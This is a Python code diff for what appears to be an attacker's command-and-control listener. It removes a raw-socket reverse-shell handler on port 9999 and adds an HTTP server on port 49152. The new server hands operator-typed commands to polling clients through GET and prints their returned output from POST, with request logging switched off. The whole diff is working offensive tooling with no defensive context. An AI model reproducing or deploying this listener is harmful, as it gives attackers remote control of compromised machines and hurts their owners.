@@ -1,35 +1,27 @@
-import socket
-from threading import Thread
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
-class NetListener:
-    def __init__(self):
-        self.HOST = '0.0.0.0'
-        self.LPORT = 9999
+class HTTPHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        msg = input("❯ ")
+        self.wfile.write(msg.encode('utf-8'))
 
-    def send_command(self):
-        while True:
-            cmd = input() + '\n'
-            self.conn.send(cmd.encode())
-            if cmd == "exit\n":
-                break
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        print(post_data)
+        self.send_response_only(200, b"recieved")
+        self.end_headers()
 
-    def recv_output(self):
-        while True:
-            data = self.conn.recv(1024).decode(errors="ignore")
-            print(data)
+    def log_message(self, format, *args):
+        pass
 
-    def start(self):
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.socket.bind((self.HOST, self.LPORT))
-        print("listening on", self.HOST, self.LPORT)
-        self.socket.listen(1)
-        self.conn, addr = self.socket.accept()
-        print("connected to", addr)
-        Thread(target=self.recv_output, args=[], daemon=True).start()
-        m_ = Thread(target=self.send_command, args=[])
-        m_.start()
-        m_.join()
-        self.socket.shutdown(socket.SHUT_RDWR)
-        self.socket.close()
+
+if __name__ == "__main__":
+    PORT = 49152
+    print('Starting Listener...')
+    httpd = HTTPServer(('', PORT), HTTPHandler)
+    print(f'listener initiated on port {PORT}')
+    httpd.serve_forever()
